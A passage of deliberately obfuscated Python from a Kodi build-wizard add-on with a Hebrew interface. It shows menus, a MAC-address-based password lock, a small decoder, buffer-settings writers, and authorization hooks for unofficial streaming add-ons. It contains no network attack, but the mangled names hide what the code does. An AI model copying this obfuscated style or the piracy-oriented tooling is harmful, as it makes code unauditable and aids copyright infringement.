							O0OO00OOO0OO00000 =O0OO00OOO0OO00000 [:O0OO00OOO0OO00000 .find ("/")]#line:1719
						elif O0OO00OOO0OO00000 .find (">")>0 :#line:1720
							O0OO00OOO0OO00000 =O0OO00OOO0OO00000 [:O0OO00OOO0OO00000 .find (">")]#line:1721
					OOOOO0OOO00OO000O .append (O0OO00OOO0OO00000 .strip ())#line:1723
			O0000OOOOOOOOO000 =OOOOO0OOO00OO000O #line:1724
		else :#line:1725
			OOOOO0OOO00OO000O =[]#line:1726
			for OO00O0O0O0O0O0OOO in O0000OOOOOOOOO000 :#line:1727
				O00OOO0OOO000O000 =u"</"+name #line:1728
				O0000000000OOOOO0 =O0OO0O00OOOO00OO0 .find (OO00O0O0O0O0O0OOO )#line:1730
				O0OOO0OOOOOO000OO =O0OO0O00OOOO00OO0 .find (O00OOO0OOO000O000 ,O0000000000OOOOO0 )#line:1731
				O000000OO0O000O0O =O0OO0O00OOOO00OO0 .find ("<"+name ,O0000000000OOOOO0 +1 )#line:1732
				while O000000OO0O000O0O <O0OOO0OOOOOO000OO and O000000OO0O000O0O !=-1 :#line:1734
					OOO0O0OOO0O00OOOO =O0OO0O00OOOO00OO0 .find (O00OOO0OOO000O000 ,O0OOO0OOOOOO000OO +len (O00OOO0OOO000O000 ))#line:1735
					if OOO0O0OOO0O00OOOO !=-1 :#line:1736
						O0OOO0OOOOOO000OO =OOO0O0OOO0O00OOOO #line:1737
					O000000OO0O000O0O =O0OO0O00OOOO00OO0 .find ("<"+name ,O000000OO0O000O0O +1 )#line:1738
				if O0000000000OOOOO0 ==-1 and O0OOO0OOOOOO000OO ==-1 :#line:1740
					OO000O0OO00O0O000 =u""#line:1741
				elif O0000000000OOOOO0 >-1 and O0OOO0OOOOOO000OO >-1 :#line:1742
					OO000O0OO00O0O000 =O0OO0O00OOOO00OO0 [O0000000000OOOOO0 +len (OO00O0O0O0O0O0OOO ):O0OOO0OOOOOO000OO ]#line:1743
				elif O0OOO0OOOOOO000OO >-1 :#line:1744
					OO000O0OO00O0O000 =O0OO0O00OOOO00OO0 [:O0OOO0OOOOOO000OO ]#line:1745
				elif O0000000000OOOOO0 >-1 :#line:1746
					OO000O0OO00O0O000 =O0OO0O00OOOO00OO0 [O0000000000OOOOO0 +len (OO00O0O0O0O0O0OOO ):]#line:1747
				if ret :#line:1749
					O00OOO0OOO000O000 =O0OO0O00OOOO00OO0 [O0OOO0OOOOOO000OO :O0OO0O00OOOO00OO0 .find (">",O0OO0O00OOOO00OO0 .find (O00OOO0OOO000O000 ))+1 ]#line:1750
					OO000O0OO00O0O000 =OO00O0O0O0O0O0OOO +OO000O0OO00O0O000 +O00OOO0OOO000O000 #line:1751
				O0OO0O00OOOO00OO0 =O0OO0O00OOOO00OO0 [O0OO0O00OOOO00OO0 .find (OO000O0OO00O0O000 ,O0OO0O00OOOO00OO0 .find (OO00O0O0O0O0O0OOO ))+len (OO000O0OO00O0O000 ):]#line:1753
				OOOOO0OOO00OO000O .append (OO000O0OO00O0O000 )#line:1754
			O0000OOOOOOOOO000 =OOOOO0OOO00OO000O #line:1755
		OO0OO0000O0OO00O0 +=O0000OOOOOOOOO000 #line:1756
	return OO0OO0000O0OO00O0 #line:1758
def addItem (O00O00000O0O0O0OO ,O00O0O0OO000OOOOO ,OOOO000OOOOO0O000 ,O0OOOOO0O000000O0 ,O0O000O00OOO00000 ,description =None ):#line:1760
	if description ==None :description =''#line:1761
	description ='[COLOR white]'+description +'[/COLOR]'#line:1762
	O00OOO000OOOOOOOO =sys .argv [0 ]+"?url="+urllib .quote_plus (O00O0O0OO000OOOOO )+"&mode="+str (OOOO000OOOOO0O000 )+"&name="+urllib .quote_plus (O00O00000O0O0O0OO )+"&iconimage="+urllib .quote_plus (O0OOOOO0O000000O0 )+"&fanart="+urllib .quote_plus (O0O000O00OOO00000 )#line:1763
	O000O0O00O000O0O0 =True #line:1764
	O0OOOO0OO0O0OO00O =xbmcgui .ListItem (O00O00000O0O0O0OO ,iconImage =O0OOOOO0O000000O0 ,thumbnailImage =O0OOOOO0O000000O0 )#line:1765
	O0OOOO0OO0O0OO00O .setInfo (type ="Video",infoLabels ={"Title":O00O00000O0O0O0OO ,"Plot":description })#line:1766
	O0OOOO0OO0O0OO00O .setProperty ("fanart_Image",O0O000O00OOO00000 )#line:1767
	O0OOOO0OO0O0OO00O .setProperty ("icon_Image",O0OOOOO0O000000O0 )#line:1768
	O000O0O00O000O0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OOO000OOOOOOOO ,listitem =O0OOOO0OO0O0OO00O ,isFolder =False )#line:1769
	return O000O0O00O000O0O0 #line:1770
def get_params ():#line:1772
		O0OOO0OO00O000O00 =[]#line:1773
		OO00O0O00O0OO000O =sys .argv [2 ]#line:1774
		if len (OO00O0O00O0OO000O )>=2 :#line:1775
				OO00OO0O000OOO000 =sys .argv [2 ]#line:1776
				OO0O0000OOOO0O000 =OO00OO0O000OOO000 .replace ('?','')#line:1777
				if (OO00OO0O000OOO000 [len (OO00OO0O000OOO000 )-1 ]=='/'):#line:1778
						OO00OO0O000OOO000 =OO00OO0O000OOO000 [0 :len (OO00OO0O000OOO000 )-2 ]#line:1779
				OOOO00O0O000O0OOO =OO0O0000OOOO0O000 .split ('&')#line:1780
				O0OOO0OO00O000O00 ={}#line:1781
				for OO000OO0O0000O000 in range (len (OOOO00O0O000O0OOO )):#line:1782
						OO0O0OO000OO000O0 ={}#line:1783
						OO0O0OO000OO000O0 =OOOO00O0O000O0OOO [OO000OO0O0000O000 ].split ('=')#line:1784
						if (len (OO0O0OO000OO000O0 ))==2 :#line:1785
								O0OOO0OO00O000O00 [OO0O0OO000OO000O0 [0 ]]=OO0O0OO000OO000O0 [1 ]#line:1786
		return O0OOO0OO00O000O00 #line:1788
def decode (O0OOOO0O0O00OOO00 ,O0OOOOO0OOOOO0O0O ):#line:1793
    import base64 #line:1794
    O0OOO00O0O0O00OO0 =[]#line:1795
    if (len (O0OOOO0O0O00OOO00 ))!=4 :#line:1797
     return 10 #line:1798
    O0OOOOO0OOOOO0O0O =base64 .urlsafe_b64decode (O0OOOOO0OOOOO0O0O )#line:1799
    for O00O0O0OO000O0OO0 in range (len (O0OOOOO0OOOOO0O0O )):#line:1801
        O000O00OOOO0OOOO0 =O0OOOO0O0O00OOO00 [O00O0O0OO000O0OO0 %len (O0OOOO0O0O00OOO00 )]#line:1802
        O00O0OO0OOO000O00 =chr ((256 +ord (O0OOOOO0OOOOO0O0O [O00O0O0OO000O0OO0 ])-ord (O000O00OOOO0OOOO0 ))%256 )#line:1803
        O0OOO00O0O0O00OO0 .append (O00O0OO0OOO000O00 )#line:1804
    return "".join (O0OOO00O0O0O00OO0 )#line:1805
def tmdb_list (OO0OOOOOOOO0O0000 ):#line:1806
    OO0O00O0O0O000OOO =decode ("7643",OO0OOOOOOOO0O0000 )#line:1809
    return int (OO0O00O0O0O000OOO )#line:1812
def u_list (OOO0OOO0O0OO0000O ):#line:1813
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1815
        from math import sqrt #line:1816
        OO00OO000000O000O =tmdb_list (TMDB_NEW_API )#line:1817
        O0O0000O0O00OO000 =str ((getHwAddr ('eth0'))*OO00OO000000O000O )#line:1819
        OO0OOOOOOOO0000O0 =int (O0O0000O0O00OO000 [1 ]+O0O0000O0O00OO000 [2 ]+O0O0000O0O00OO000 [5 ]+O0O0000O0O00OO000 [7 ])#line:1820
        OO000OOOOO0OOO00O =(ADDON .getSetting ("pass"))#line:1822
        O00O0OOO000000000 =(str (round (sqrt ((OO0OOOOOOOO0000O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1827
        if '.'in O00O0OOO000000000 :#line:1829
         O00O0OOO000000000 =(str (round (sqrt ((OO0OOOOOOOO0000O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1830
        if OO000OOOOO0OOO00O ==O00O0OOO000000000 :#line:1832
          OOOO000O00000OOO0 =OOO0OOO0O0OO0000O #line:1834
        else :#line:1836
           if STARTP2 ()and STARTP ()=='ok':#line:1837
             return OOO0OOO0O0OO0000O #line:1840
           OOOO000O00000OOO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1841
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1842
           sys .exit ()#line:1843
        return OOOO000O00000OOO0 #line:1844
    else :#line:1845
        STARTP ()#line:1846
def disply_hwr ():#line:1850
   try :#line:1851
    O0OO0OOOOOO00O00O =tmdb_list (TMDB_NEW_API )#line:1852
    OO0OOOOOOOO0OO00O =str ((getHwAddr ('eth0'))*O0OO0OOOOOO00O00O )#line:1853
    O0O000OOOOO0O0OO0 =(OO0OOOOOOOO0OO00O [1 ]+OO0OOOOOOOO0OO00O [2 ]+OO0OOOOOOOO0OO00O [5 ]+OO0OOOOOOOO0OO00O [7 ])#line:1860
    OOOO00OO0OOO0O0OO =(ADDON .getSetting ("action"))#line:1861
    wiz .setS ('action',str (O0O000OOOOO0O0OO0 ))#line:1863
   except :pass #line:1864
def disply_hwr2 ():#line:1865
   try :#line:1866
    O0O0000000OOOO0OO =tmdb_list (TMDB_NEW_API )#line:1867
    O000O00O00OOO00OO =str ((getHwAddr ('eth0'))*O0O0000000OOOO0OO )#line:1869
    OO000O0OO0000O000 =(O000O00O00OOO00OO [1 ]+O000O00O00OOO00OO [2 ]+O000O00O00OOO00OO [5 ]+O000O00O00OOO00OO [7 ])#line:1878
    O0OO0O00OOO00OO0O =(ADDON .getSetting ("action"))#line:1879
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO000O0OO0000O000 )#line:1882
   except :pass #line:1883
def getHwAddr (OOO0O0OO0OOOO0000 ):#line:1885
   import subprocess ,time #line:1886
   O0OOO0O0OOOO000OO ='windows'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
       O0OOO0O0OOOO000OO ='android'#line:1889
   if xbmc .getCondVisibility ('system.platform.android'):#line:1890
     O0O0O000OOOO000OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1891
     O00O00OO0000O0O00 =re .compile ('link/ether (.+?) brd').findall (str (O0O0O000OOOO000OO ))#line:1893
     OO000OOOOO0OO00O0 =0 #line:1894
     for O0OO0OO00000O0O00 in O00O00OO0000O0O00 :#line:1895
      if O00O00OO0000O0O00 !='00:00:00:00:00:00':#line:1896
          O0OOOOOOO00OO0000 =O0OO0OO00000O0O00 #line:1897
          OO000OOOOO0OO00O0 =OO000OOOOO0OO00O0 +int (O0OOOOOOO00OO0000 .replace (':',''),16 )#line:1898
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1900
       O0OOO000OO0O0OO0O =0 #line:1901
       OO000OOOOO0OO00O0 =0 #line:1902
       O00O0O000O000O00O =[]#line:1903
       O00000000O0OOO000 =os .popen ("getmac").read ()#line:1904
       O00000000O0OOO000 =O00000000O0OOO000 .split ("\n")#line:1905
       for OO00000000O00OO00 in O00000000O0OOO000 :#line:1907
            OOO0O0000O00OOOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO00000000O00OO00 ,re .I )#line:1908
            if OOO0O0000O00OOOOO :#line:1909
                O00O00OO0000O0O00 =OOO0O0000O00OOOOO .group ().replace ('-',':')#line:1910
                O00O0O000O000O00O .append (O00O00OO0000O0O00 )#line:1911
                OO000OOOOO0OO00O0 =OO000OOOOO0OO00O0 +int (O00O00OO0000O0O00 .replace (':',''),16 )#line:1914
   else :#line:1916
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1917
   try :#line:1934
    return OO000OOOOO0OO00O0 #line:1935
   except :pass #line:1936
def getpass ():#line:1937
	disply_hwr2 ()#line:1939
def setpass ():#line:1940
    OO00000OO0OOO00O0 =xbmcgui .Dialog ()#line:1941
    O00000OO00O000OOO =''#line:1942
    OO0O00O00O0O0O000 =xbmc .Keyboard (O00000OO00O000OOO ,'הכנס סיסמה')#line:1944
    OO0O00O00O0O0O000 .doModal ()#line:1945
    if OO0O00O00O0O0O000 .isConfirmed ():#line:1946
           OO0O00O00O0O0O000 =OO0O00O00O0O0O000 .getText ()#line:1947
    wiz .setS ('pass',str (OO0O00O00O0O0O000 ))#line:1948
def setuname ():#line:1949
    OOOOOO00OO000O0OO =''#line:1950
    OOO0OOOO0O0O00000 =xbmc .Keyboard (OOOOOO00OO000O0OO ,'הכנס שם משתמש')#line:1951
    OOO0OOOO0O0O00000 .doModal ()#line:1952
    if OOO0OOOO0O0O00000 .isConfirmed ():#line:1953
           OOOOOO00OO000O0OO =OOO0OOOO0O0O00000 .getText ()#line:1954
           wiz .setS ('user',str (OOOOOO00OO000O0OO ))#line:1955
def powerkodi ():#line:1956
    os ._exit (1 )#line:1957
def buffer1 ():#line:1959
	OOOOO0O0O00O0000O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1960
	OOOO00OO000O0O0O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1961
	OO0O000O0O00O00O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1962
	OO0OOO0000O0OO00O =re .sub ('[^0-9]','',OO0O000O0O00O00O0 )#line:1963
	OO0OOO0000O0OO00O =int (OO0OOO0000O0OO00O )/3 #line:1964
	OOO000OOOO0O0O0OO =OO0OOO0000O0OO00O *1024 *1024 #line:1965
	try :O0OO0O000OOOOOOO0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1966
	except :O0OO0O000OOOOOOO0 =16 #line:1967
	OOO0OO0O0OOOO0000 =DIALOG .yesno ('FREE MEMORY: '+str (OO0O000O0O00O00O0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0OOO0000O0OO00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1970
	if OOO0OO0O0OOOO0000 ==1 :#line:1971
		with open (OOOOO0O0O00O0000O ,"w")as OOO00OO0O0000O0O0 :#line:1972
			if O0OO0O000OOOOOOO0 >=17 :OOOO00O0OO000OOOO =xml_data_advSettings_New (str (OOO000OOOO0O0O0OO ))#line:1973
			else :OOOO00O0OO000OOOO =xml_data_advSettings_old (str (OOO000OOOO0O0O0OO ))#line:1974
			OOO00OO0O0000O0O0 .write (OOOO00O0OO000OOOO )#line:1976
			DIALOG .ok ('Buffer Size Set to: '+str (OOO000OOOO0O0O0OO ),'Please restart Kodi for settings to apply.','')#line:1977
	elif OOO0OO0O0OOOO0000 ==0 :#line:1979
		OOO000OOOO0O0O0OO =_O000000O00OOOO0O0 (default =str (OOO000OOOO0O0O0OO ),heading ="INPUT BUFFER SIZE")#line:1980
		with open (OOOOO0O0O00O0000O ,"w")as OOO00OO0O0000O0O0 :#line:1981
			if O0OO0O000OOOOOOO0 >=17 :OOOO00O0OO000OOOO =xml_data_advSettings_New (str (OOO000OOOO0O0O0OO ))#line:1982
			else :OOOO00O0OO000OOOO =xml_data_advSettings_old (str (OOO000OOOO0O0O0OO ))#line:1983
			OOO00OO0O0000O0O0 .write (OOOO00O0OO000OOOO )#line:1984
			DIALOG .ok ('Buffer Size Set to: '+str (OOO000OOOO0O0O0OO ),'Please restart Kodi for settings to apply.','')#line:1985
def xml_data_advSettings_old (OOO0000O0OO0OO0O0 ):#line:1986
	OOO0OOOOO0OO0OOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO0000O0OO0OO0O0 #line:1996
	return OOO0OOOOO0OO0OOOO #line:1997
def xml_data_advSettings_New (OOOO000OO0000O0O0 ):#line:1999
	OOOOO000000O0O00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOOO000OO0000O0O0 #line:2011
	return OOOOO000000O0O00O #line:2012
def write_ADV_SETTINGS_XML (O00O00000000OO00O ):#line:2013
    if not os .path .exists (xml_file ):#line:2014
        with open (xml_file ,"w")as O00O00O0O0OOO000O :#line:2015
            O00O00O0O0OOO000O .write (xml_data )#line:2016
def _O000000O00OOOO0O0 (default ="",heading ="",hidden =False ):#line:2017
    ""#line:2018
    OOO0OO0O0O0O0O0OO =xbmc .Keyboard (default ,heading ,hidden )#line:2019
    OOO0OO0O0O0O0O0OO .doModal ()#line:2020
    if (OOO0OO0O0O0O0O0OO .isConfirmed ()):#line:2021
        return unicode (OOO0OO0O0O0O0O0OO .getText (),"utf-8")#line:2022
    return default #line:2023
def index ():#line:2025
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2026
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2027
	if AUTOUPDATE =='Yes':#line:2028
		if wiz .workingURL (WIZARDFILE )==True :#line:2029
			OO00OOOO0OOO00O0O =wiz .checkWizard ('version')#line:2030
			if OO00OOOO0OOO00O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO00OOOO0OOO00O0O ),'wizardupdate',themeit =THEME2 )#line:2031
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	if len (BUILDNAME )>0 :#line:2035
		OOOO0OO0OO0000OO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2036
		OOO0O00000OO0O0O0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2037
		if OOOO0OO0OO0000OO0 >BUILDVERSION :OOO0O00000OO0O0O0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOO0O00000OO0O0O0 ,OOOO0OO0OO0000OO0 )#line:2038
		addDir (OOO0O00000OO0O0O0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2040
		try :#line:2042
		     O000O0O0OO00OOOOO =wiz .themeCount (BUILDNAME )#line:2043
		except :#line:2044
		   O000O0O0OO00OOOOO =False #line:2045
		if not O000O0O0OO00OOOOO ==False :#line:2046
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2047
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2048
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2051
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2053
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2057
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2059
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2061
def morsetup ():#line:2063
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2066
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2067
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2072
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2076
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2078
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2079
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2089
	setView ('files','viewType')#line:2090
def morsetup2 ():#line:2091
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2092
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2101
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2102
def fastupdate ():#line:2103
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2104
def forcefastupdate ():#line:2106
			OO00O0OOOO0OOO0OO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2107
			wiz .ForceFastUpDate (ADDONTITLE ,OO00O0OOOO0OOO0OO )#line:2108
def rdsetup ():#line:2112
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2113
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2116
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2117
def traktsetup ():#line:2120
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2126
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2127
	setView ('files','viewType')#line:2128
def setautorealdebrid ():#line:2129
    from resources .libs import real_debrid #line:2130
    OOOO00O0O0O0OO00O =real_debrid .RealDebridFirst ()#line:2131
    OOOO00O0O0O0OO00O .auth ()#line:2132
def setrealdebrid ():#line:2134
    O0OOO0O0OOO0O0O0O =(ADDON .getSetting ("auto_rd"))#line:2135
    if O0OOO0O0OOO0O0O0O =='false':#line:2136
       ADDON .openSettings ()#line:2137
    else :#line:2138
        from resources .libs import real_debrid #line:2139
        OOOOOOO0O0000O0OO =real_debrid .RealDebrid ()#line:2140
        OOOOOOO0O0000O0OO .auth ()#line:2141
        rdon ()#line:2144
def resolveurlsetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2147
def urlresolversetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2149
def placentasetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2152
def reptiliasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2154
def flixnetsetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2156
def yodasetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2158
def numberssetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2160
def uranussetup ():#line:2161
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2162
def genesissetup ():#line:2163
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2164
def net_tools (view =None ):#line:2166
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2167
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2168
	setView ('files','viewType')#line:2170
def speedMenu ():#line:2171
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2172
def viewIP ():#line:2173
	OOOO0O00OO0OO00OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2187
	OO00O0OO00O0OOOO0 =[];O00O00OOOOO00O0OO =0 #line:2188
	for OO0000OOOOO0O00OO in OOOO0O00OO0OO00OO :#line:2189
		OO0O00OO0OO00OOO0 =wiz .getInfo (OO0000OOOOO0O00OO )#line:2190
		OOO0000O000OOO00O =0 #line:2191
		while OO0O00OO0OO00OOO0 =="Busy"and OOO0000O000OOO00O <10 :#line:2192
			OO0O00OO0OO00OOO0 =wiz .getInfo (OO0000OOOOO0O00OO );OOO0000O000OOO00O +=1 ;wiz .log ("%s sleep %s"%(OO0000OOOOO0O00OO ,str (OOO0000O000OOO00O )));xbmc .sleep (1000 )#line:2193
		OO00O0OO00O0OOOO0 .append (OO0O00OO0OO00OOO0 )#line:2194
		O00O00OOOOO00O0OO +=1 #line:2195
	OOO00O0OOO0O0O00O ,OOOO000OO0OOO0OO0 ,OOOO0O0O000O0O0OO =getIP ()#line:2196
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO00O0OOOO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0OOO0O0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000OO0OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0O000O0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2200
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OO00O0OOOO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2201
	setView ('files','viewType')#line:2202
def buildMenu ():#line:2204
	if USERNAME =='':#line:2205
		ADDON .openSettings ()#line:2206
		sys .exit ()#line:2207
	if PASSWORD =='':#line:2208
		ADDON .openSettings ()#line:2209
	OO00OOO00OO00OO0O =u_list (SPEEDFILE )#line:2210
	(OO00OOO00OO00OO0O )#line:2211
	O0OO0OO00OOOO00O0 =(wiz .workingURL (OO00OOO00OO00OO0O ))#line:2212
	(O0OO0OO00OOOO00O0 )#line:2213
	O0OO0OO00OOOO00O0 =wiz .workingURL (SPEEDFILE )#line:2214
	if not O0OO0OO00OOOO00O0 ==True :#line:2215
